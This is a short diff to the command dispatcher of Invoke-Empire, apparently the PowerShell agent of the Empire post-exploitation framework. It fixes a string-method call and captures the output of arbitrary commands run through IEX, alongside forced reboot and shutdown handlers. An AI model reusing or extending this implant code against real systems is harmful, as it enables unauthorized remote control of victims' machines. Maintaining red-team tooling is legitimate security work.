@@ -377,7 +377,7 @@ function Invoke-Empire {
                 }
                 getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
                 route {
-                    if (($cmdargs.length -eq '') -or ($cmdargs.lower() -eq 'print')) {
+                    if (($cmdargs.length -eq '') -or ($cmdargs.ToLower() -eq 'print')) {
                         # build a table of adapter interfaces indexes -> IP address for the adapater
                         $adapters = @{}
                         Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
@@ -410,8 +410,8 @@ function Invoke-Empire {
                 '(reboot|restart)' { Restart-Computer -force }
                 shutdown { Stop-Computer -force }
                 default {
-                    if ($cmdargs.length -eq '') { $output = IEX $cmd }
-                    else { $output = IEX "$cmd $cmdargs" }
+                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String }
+                    else { $output = IEX "$cmd $cmdargs" | Out-String }
                 }
             }
         }
